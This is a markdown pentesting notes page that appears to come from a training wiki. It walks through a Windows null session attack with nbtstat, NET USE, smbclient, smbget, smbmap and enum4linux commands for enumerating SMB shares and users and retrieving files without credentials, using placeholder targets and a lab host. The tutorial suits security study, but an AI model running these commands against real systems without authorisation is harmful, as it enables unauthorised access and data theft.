---
title: Windows Null session attack
author: amandaguglieri
draft: false
TableOfContents: true
tag: #pentesting #windows 
---

# Windows Null session attack

It’s used to enumerate info (password, system users, system groups. running system processes). A null session attack exploits an authentification vulnerability for Windows Administrative Shares. This lets an attacker connect to a local or remote share without authentification.

## Manually from Windows

1.  **Enumerate File Server services**:    

```cmd
nbtstat -A <target IP>   

# ELS-WINXP   <00>   UNIQUE   Registered
# <00> tells us ELS-WINXP is a workstation.
# <20> says that the file sharing service is up and running on the machine
# UNIQUE tells us that this compiter must have only one IP address assigned
```

2.  **Enumerate Windows Shares**. Once we spot a machine with the File Server service running, we can enumerate:

```
NET VIEW <target IP>
```

3.  Verify if a null attack is possible by exploiting the IPC$ administrative share and trying to connect without valid credentials.

```
NET USE \\<target IP address>\IPC$ ‘’ /u:’’
```

This tells Windows to connect to the IPC$ share by using an empty password and a empty username. It only works with IPC$ (not c$).

## Manually from Linux

Using the samba suite: https://www.samba.org/

1.  **Enumerate File Server services**: 

```bash
nmblookup -A <target IP>
```

2.  Also with the smbclient we can **enumerate the shares** provides by a host:  

```bash
smbclient -L //<target IP> -N

# -L  Look at what services are available on a target
# <targetIP> Prepend the two slahes
# -N  Force the tool not to ask for a password
```

3.  Connect:

```bash
smbclient \\<tt IP>\sharedfolder -N
```

Be careful, sometimes the shell removes the slashes and you need to escape them.

4.  Once connected you can browse with the smb command line. To see allowed commands: help 
5.  When you know the path of a file and you want to retrieve it:
	- from kali: 
	```bash
	smbget smb://<target IP>/SharedFolder/flag_1.txt
	```
	- from  smb command line: 
	```smb
	get flag_1.txt
	```

6.  To map users with permissions

```bash
smbmap -H demo.ine.local
```
 
To get an specific file in a connection: get flag.txt

## Tricks

Enumerate users with enum4linux -U demo.ine.local

Enumerate the permissions of users with smbmap -H demo.ine.local

If some users are missing in the permission list, maybe they are accesible, try with:

```
smbclient -L //<target IP>\<user> -N
```

## More tools

- [Winfo](winfo.md).
- [enum](enum.md).
- [enum4linux](enum4linux.md).
- [SAMRDump](samrdump.md).
